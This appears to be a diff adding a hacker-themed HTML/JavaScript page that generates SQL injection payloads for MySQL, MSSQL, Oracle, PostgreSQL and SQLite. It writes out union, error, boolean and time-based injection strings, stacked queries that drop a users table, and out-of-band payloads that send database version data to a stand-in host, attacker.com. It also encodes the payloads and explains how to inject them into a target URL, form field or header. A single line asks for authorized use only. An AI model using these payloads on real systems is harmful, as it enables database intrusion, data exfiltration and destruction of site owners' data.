@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SQL Injection Payloads</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    .payload-preview {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px dashed #c58b00;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      min-height: 80px;
+    }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/1761817527453041720p.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>🛡️ SQL Injection Payloads</h1>
+    <label>Target URL:</label>
+    <input type="text" id="url" placeholder="https://example.com/login.php" />
+    <div class="row">
+      <div>
+        <label>Injection Type:</label>
+        <select id="injection-type">
+          <option value="union">Union-based</option>
+          <option value="error">Error-based</option>
+          <option value="boolean">Boolean-based</option>
+          <option value="time">Time-based</option>
+          <option value="stacked">Stacked Queries</option>
+          <option value="out-of-band">Out-of-band</option>
+        </select>
+      </div>
+      <div>
+        <label>Database Type:</label>
+        <select id="db-type">
+          <option value="mysql">MySQL</option>
+          <option value="mssql">MSSQL</option>
+          <option value="oracle">Oracle</option>
+          <option value="postgresql">PostgreSQL</option>
+          <option value="sqlite">SQLite</option>
+        </select>
+      </div>
+    </div>
+    <label>Parameter Name:</label>
+    <input type="text" id="param-name" placeholder="username, id, search, etc." />
+    <label>Custom Payload:</label>
+    <textarea id="custom-payload" rows="5" placeholder="' OR 1=1 --"></textarea>
+    <div class="row">
+      <div>
+        <label>Encoding:</label>
+        <select id="encoding">
+          <option value="none">None</option>
+          <option value="url">URL Encode</option>
+          <option value="html">HTML Entity</option>
+          <option value="base64">Base64</option>
+        </select>
+      </div>
+      <div>
+        <label>Injection Point:</label>
+        <select id="injection-point">
+          <option value="query">Query Parameter</option>
+          <option value="form">Form Field</option>
+          <option value="header">HTTP Header</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <button onclick="generatePayload()">Generate Payload</button>
+      <button onclick="testPayload()">Test Payload</button>
+    </div>
+    <div class="row">
+      <button onclick="copyPayload()">Copy Payload</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: Use these payloads only on systems you have permission to test. Never use on production systems without authorization.</div>
+    <label>Generated Payload:</label>
+    <div id="payload-preview" class="payload-preview">No payload generated yet...</div>
+    <label>Result:</label>
+    <pre id="result-box">No result yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    const payloadPreview = document.getElementById("payload-preview");
+    let history = [];
+    let currentPayload = "";
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generatePayload() {
+      const injectionType = document.getElementById("injection-type").value;
+      const dbType = document.getElementById("db-type").value;
+      const paramName = document.getElementById("param-name").value || "id";
+      const customPayload = document.getElementById("custom-payload").value;
+      const encoding = document.getElementById("encoding").value;
+      const injectionPoint = document.getElementById("injection-point").value;
+      
+      let payload = "";
+      
+      if (customPayload) {
+        payload = customPayload;
+      } else {
+        // Generate payload based on injection type and database
+        switch(injectionType) {
+          case "union":
+            payload = generateUnionPayload(dbType, paramName);
+            break;
+          case "error":
+            payload = generateErrorPayload(dbType, paramName);
+            break;
+          case "boolean":
+            payload = generateBooleanPayload(dbType, paramName);
+            break;
+          case "time":
+            payload = generateTimePayload(dbType, paramName);
+            break;
+          case "stacked":
+            payload = generateStackedPayload(dbType, paramName);
+            break;
+          case "out-of-band":
+            payload = generateOutOfBandPayload(dbType, paramName);
+            break;
+          default:
+            payload = "' OR 1=1 --";
+        }
+      }
+      
+      // Apply encoding
+      if (encoding !== "none") {
+        payload = encodePayload(payload, encoding);
+      }
+      
+      currentPayload = payload;
+      payloadPreview.textContent = payload;
+      resultBox.textContent = `Generated ${injectionType} payload for ${dbType}\nInjection point: ${injectionPoint}\nParameter: ${paramName}`;
+      logHistory(`Generated ${injectionType} payload`, payload.substring(0, 50));
+    }
+    
+    function generateUnionPayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `' UNION SELECT 1,2,3,4,5 --`;
+        case "mssql":
+          return `' UNION SELECT NULL,NULL,NULL,NULL --`;
+        case "oracle":
+          return `' UNION SELECT NULL,NULL,NULL FROM DUAL --`;
+        case "postgresql":
+          return `' UNION SELECT NULL,NULL,NULL,NULL --`;
+        case "sqlite":
+          return `' UNION SELECT 1,2,3,4,5 --`;
+        default:
+          return `' UNION SELECT 1,2,3,4,5 --`;
+      }
+    }
+    
+    function generateErrorPayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`;
+        case "mssql":
+          return `' AND 1=CONVERT(int,(SELECT @@version)) --`;
+        case "oracle":
+          return `' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||chr(58)||(SELECT version FROM v$instance)||chr(58)||chr(58)||chr(62))) FROM dual) --`;
+        case "postgresql":
+          return `' AND 1=CAST((SELECT version()) AS INT) --`;
+        case "sqlite":
+          return `' AND 1=(SELECT sqlite_version()) --`;
+        default:
+          return `' AND 1=1 --`;
+      }
+    }
+    
+    function generateBooleanPayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `' AND (SELECT LENGTH(user()) > 10) --`;
+        case "mssql":
+          return `' AND (SELECT LEN(USER_NAME()) > 10) --`;
+        case "oracle":
+          return `' AND (SELECT LENGTH(USER) > 10 FROM DUAL) --`;
+        case "postgresql":
+          return `' AND (SELECT LENGTH(current_user) > 10) --`;
+        case "sqlite":
+          return `' AND (SELECT LENGTH(sqlite_version()) > 10) --`;
+        default:
+          return `' AND 1=1 --`;
+      }
+    }
+    
+    function generateTimePayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `'; IF(SUBSTRING(user(),1,1)='a', BENCHMARK(1000000,MD5(1)), null) --`;
+        case "mssql":
+          return `'; IF (SUBSTRING(USER_NAME(),1,1)='a') WAITFOR DELAY '0:0:5' --`;
+        case "oracle":
+          return `'; IF (SUBSTR(USER,1,1)='a') THEN DBMS_LOCK.SLEEP(5); END IF; --`;
+        case "postgresql":
+          return `'; SELECT PG_SLEEP(5) --`;
+        case "sqlite":
+          return `'; AND (SELECT COUNT(*) FROM SQLITE_MASTER WHERE NAME LIKE 'sqlite_%' AND LENGTH(sqlite_version())>10) --`;
+        default:
+          return `'; WAITFOR DELAY '0:0:5' --`;
+      }
+    }
+    
+    function generateStackedPayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `'; DROP TABLE users; --`;
+        case "mssql":
+          return `'; DROP TABLE users; --`;
+        case "oracle":
+          return `'; EXECUTE IMMEDIATE 'DROP TABLE users'; --`;
+        case "postgresql":
+          return `'; DROP TABLE users; --`;
+        case "sqlite":
+          return `'; DROP TABLE users; --`;
+        default:
+          return `'; DROP TABLE users; --`;
+      }
+    }
+    
+    function generateOutOfBandPayload(db, param) {
+      switch(db) {
+        case "mysql":
+          return `'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')) --`;
+        case "mssql":
+          return `'; EXEC master..xp_dirtree '\\\\attacker.com\\test' --`;
+        case "oracle":
+          return `'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT version())) FROM DUAL; --`;
+        case "postgresql":
+          return `'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'; --`;
+        case "sqlite":
+          return `'; ATTACH DATABASE 'http://attacker.com/' AS test; --`;
+        default:
+          return `'; EXEC master..xp_dirtree '\\\\attacker.com\\test' --`;
+      }
+    }
+    
+    function encodePayload(payload, encodingType) {
+      switch(encodingType) {
+        case "url":
+          return encodeURIComponent(payload);
+        case "html":
+          return payload.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
+        case "base64":
+          return btoa(payload);
+        default:
+          return payload;
+      }
+    }
+    
+    function testPayload() {
+      if (!currentPayload) {
+        resultBox.textContent = "❌ Generate a payload first!";
+        return;
+      }
+      
+      const url = document.getElementById("url").value.trim();
+      const paramName = document.getElementById("param-name").value || "id";
+      const injectionPoint = document.getElementById("injection-point").value;
+      
+      if (!url) {
+        resultBox.textContent = "❌ Please enter a target URL to test the payload";
+        return;
+      }
+      
+      // Create a test HTML page with the payload
+      let testPage = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>SQL Injection Test</title></head>
+        <body>
+          <h2>SQL Injection Test</h2>
+          <p>Testing payload: <strong>${escapeHtml(currentPayload)}</strong></p>
+          <p>Target URL: <strong>${escapeHtml(url)}</strong></p>
+          <p>Parameter: <strong>${escapeHtml(paramName)}</strong></p>
+          <p>Injection Point: <strong>${injectionPoint}</strong></p>
+          
+          <h3>How to use this payload:</h3>
+          <div id="instructions">
+      `;
+      
+      if (injectionPoint === "query") {
+        testPage += `
+          <p>1. Append the payload to the URL parameter:</p>
+          <pre>${escapeHtml(url)}?${escapeHtml(paramName)}=${escapeHtml(currentPayload)}</pre>
+        `;
+      } else if (injectionPoint === "form") {
+        testPage += `
+          <p>1. Insert the payload into the form field named "${escapeHtml(paramName)}":</p>
+          <pre>${escapeHtml(currentPayload)}</pre>
+        `;
+      } else if (injectionPoint === "header") {
+        testPage += `
+          <p>1. Insert the payload into the HTTP header "${escapeHtml(paramName)}":</p>
+          <pre>${escapeHtml(paramName)}: ${escapeHtml(currentPayload)}</pre>
+        `;
+      }
+      
+      testPage += `
+          </div>
+          
+          <h3>Expected Behavior:</h3>
+          <p>If vulnerable, you may see:</p>
+          <ul>
+            <li>Additional data in the response</li>
+            <li>Database error messages</li>
+            <li>Changes in response time</li>
+            <li>Unexpected behavior in the application</li>
+          </ul>
+          
+          <h3>Example vulnerable code:</h3>
+          <pre>
+// Vulnerable PHP code example
+\$query = "SELECT * FROM users WHERE ${escapeHtml(paramName)} = '\${escapeHtml(paramName)}'";
+\$result = mysqli_query(\$connection, \$query);
+          </pre>
+        </body>
+        </html>
+      `;
+      
+      // Open in a new window
+      const testWindow = window.open('', '_blank');
+      testWindow.document.write(testPage);
+      testWindow.document.close();
+      
+      resultBox.textContent = "Payload test instructions opened in new window";
+      logHistory("Tested payload", currentPayload.substring(0, 50));
+    }
+    
+    function copyPayload() {
+      if (!currentPayload) {
+        resultBox.textContent = "❌ Generate a payload first!";
+        return;
+      }
+      
+      navigator.clipboard.writeText(currentPayload).then(() => {
+        resultBox.textContent = "✅ Payload copied to clipboard!";
+        logHistory("Copied payload", currentPayload.substring(0, 50));
+      }).catch(err => {
+        resultBox.textContent = `❌ Failed to copy: ${err}`;
+      });
+    }
+    
+    function clearAll() {
+      document.getElementById("url").value = "";
+      document.getElementById("injection-type").value = "union";
+      document.getElementById("db-type").value = "mysql";
+      document.getElementById("param-name").value = "";
+      document.getElementById("custom-payload").value = "";
+      document.getElementById("encoding").value = "none";
+      document.getElementById("injection-point").value = "query";
+      payloadPreview.textContent = "No payload generated yet...";
+      resultBox.textContent = "No result yet...";
+      currentPayload = "";
+    }
+    
+    function logHistory(action, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${action}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+    
+    function escapeHtml(unsafe) {
+      return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+  </script>
+</body>
+</html>
